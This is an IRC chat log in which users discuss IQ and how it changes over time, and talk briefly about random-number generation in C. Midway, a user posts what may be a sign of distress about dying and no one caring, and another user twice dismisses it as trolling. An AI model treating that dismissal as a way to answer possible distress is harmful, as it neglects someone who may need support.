[23:42:07] *** Joins: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com)
[23:42:13] *** jazzy3 is now known as jazzy
[23:43:22] <pyzozord> omg I am so dumb, that article I linked literally says the opposite
[23:43:40] <pyzozord> "Thus, greater cognitive ability is generally advantageous—and virtually never detrimental." :|
[23:44:24] <Guest77> everyone wishes they could apply numbers to people -- it is an everquest;
[23:44:49] *** Joins: jarthur (~jarthur@2603-8080-1540-002d-ed99-7195-2785-ff6d.res6.spectrum.com)
[23:45:11] <InPhase> pyzozord: Yeah, this is the expected result.  Some people just sometimes pay disproportionate attention to counterexamples.  It's a correlation not a guarantee.
[23:45:14] *** Joins: wildo (~lain6141@119.224.72.222)
[23:45:24] <Guest77> I NEED HELP EVERYONE I'm going to die within 3 years and 0% of anyone cares about me
[23:45:56] <InPhase> Guest77: No one is responding to you because you sound like you're trolling.  What are you even doing?
[23:46:20] <Guest77> InPhase: I'm a person with a horrible problem.
[23:46:36] *** Joins: jazzy4 (~jaziz@user/jaziz)
[23:46:45] *** Quits: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com) (Read error: Connection reset by peer)
[23:47:45] *** Joins: shokohsc8 (~shokohsc@161.88.195.77.rev.sfr.net)
[23:48:31] <pyzozord> InPhase: I want so much for it true that I read it even when it litearlly says otherwise. :D
[23:49:04] <InPhase> Guest77: That again sounds like trolling if you're trying to get people to bite and drag it out of you.  If you had a real problem you wanted to ask about or discuss, I expect you would just do so.
[23:49:32] *** Quits: arcatech (~arcatech@user/arcatech) (Remote host closed the connection)
[23:49:35] *** Quits: jazzy (~jaziz@user/jaziz) (Ping timeout: 264 seconds)
[23:49:44] *** jazzy4 is now known as jazzy
[23:50:14] *** Joins: arcatech (~arcatech@user/arcatech)
[23:50:22] *** Joins: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com)
[23:50:39] <InPhase> Guest77: I don't know you other than that you came in saying you got banned from somewhere else, and then you start this sequence of out-of-discussion emotive comments.  That's not how good discussion goes.
[23:50:46] *** Quits: chomwitt (~chomwitt@2a02:587:dc02:9f00:12c3:7bff:fe6d:d374) (Ping timeout: 268 seconds)
[23:51:06] <InPhase> pyzozord: :)
[23:51:11] *** Quits: Guest77 (~Guest77@96-65-219-197-static.hfc.comcastbusiness.net) (Quit: Client closed)
[23:51:44] <jeaye> Well, that's that.
[23:51:46] <arahael> everybody dies.
[23:51:47] *** Quits: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com) (Read error: Connection reset by peer)
[23:51:55] *** Joins: Guest77 (~Guest77@96-65-219-197-static.hfc.comcastbusiness.net)
[23:52:15] *** Joins: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com)
[23:52:58] <flakland> i'm -100% sure of it
[23:53:22] <arahael> negative 100%?
[23:53:38] <flakland> ya
[23:53:53] *** Quits: arcatech (~arcatech@user/arcatech) (Client Quit)
[23:53:59] * ski would prefer to see percents disappear from common discourse
[23:54:33] <tomathy> library for random integers in C?
[23:54:46] <flakland> xor
[23:55:00] <flakland> operator
[23:55:15] <d3x0r> rand()
[23:55:21] <tomathy> wow rand is built in
[23:55:24] <InPhase> pyzozord: I'm most interested in the notions of how IQ can change over time.  It describes a real sort of generalizable intelligence, although somewhat imperfectly measured by the tests.  Except we have only a nebulous understanding of what it is actually measuring.  We also know that some individuals move up and down in IQ score over their lifetimes, and aside from old-age effects that have gotten 
[23:55:30] <InPhase> some obvious study, we don't know why these changes happen.
[23:55:42] <flakland> it's ot
[23:55:46] <tomathy> or stdlib
[23:55:47] <flakland> !builtin
[23:56:17] <tomathy> flakland: why did you say xor?
[23:56:52] *** Quits: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com) (Read error: Connection reset by peer)
[23:56:56] <flakland> https://en.wikipedia.org/wiki/Xorshift
[23:56:56] <bayaz> Title: Xorshift - Wikipedia 
[23:57:13] <pyzozord> InPhase: I've also heard that IQ has pretty high corelation with life success in general
[23:57:23] <Bou> arahael: there have been roughly 108 billion humans, in total. About 100 billion are dead, 8 billion are not. So statistically there's a 7% chance of not dying
[23:57:46] <pyzozord> which isn't great for me since I score dead in the middle. Although that notion of improving your IQ is quite interesting
[23:57:48] <d3x0r> not being dead already you mean
[23:58:07] <Guest77> the fascination with IQ is to generalize people with numbers. Take numbers out of the equation and all of people are useless.
[23:58:10] <InPhase> pyzozord: There is for example this:  https://www.humanbrainproject.eu/en/follow-hbp/news/brains-of-smarter-people-have-bigger-and-faster-neurons/
[23:58:20] <pyzozord> s/dead in the middle/dead center/ sorry not a native speaker, I invent my own phrases :P
[23:58:29] *** Quits: trace987 (~trace@ip5b429941.dynamic.kabel-deutschland.de) (Ping timeout: 256 seconds)
[23:58:43] <InPhase> pyzozord: But dendrites are not some static thing that just sits there.  They actually move around a little bit and change size and shape a bit as chemical conditions change.
[23:58:49] *** Joins: Telvana (~capo@user/telvana)
[23:59:05] *** Quits: freakazoid343 (~matt@2603:9000:cf0f:80e3:21d8:f508:23f8:99f8) (Read error: Connection reset by peer)
[23:59:27] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[23:59:41] <InPhase> pyzozord: So it's an open question exactly how much each individual's IQ can shift with different experiences or different chemical scenarios (diet?  exercise?).
[23:59:42] *** Joins: freakazoid343 (~matt@35.136.210.185)
[23:59:42] *** Joins: flakland (~flaknet99@32.211.211.39)
[23:59:51] <pyzozord> heh, very interesting
